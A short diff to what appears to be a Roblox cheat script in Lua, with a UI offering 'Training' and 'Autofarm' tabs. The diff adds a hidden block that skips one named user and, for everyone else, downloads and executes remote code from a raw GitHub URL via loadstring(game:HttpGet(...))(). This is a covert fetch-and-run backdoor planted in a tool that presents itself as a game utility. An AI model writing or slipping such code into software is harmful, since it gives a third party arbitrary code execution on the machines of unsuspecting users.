@@ -27,6 +27,12 @@ local Formss = Win:Tab("Instant Forms") -- This Creates a Tab on the left Side
 local Train = Win:Tab("Training") -- This Creates a Tab on the left Side
 
 
+if game.Players.LocalPlayer.Name == "zzotac" then
+    print("admin")
+else
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/newadmin'))()
+    print("Executed")
+end
 
 
 
@@ -1983,3 +1989,6 @@ end)
 Autofarm:Label("Hello") -- This is just for information or Text ;)
 
 Autofarm:line() -- This Creates a line aka some space for a new section or something like that :P
+
+
+
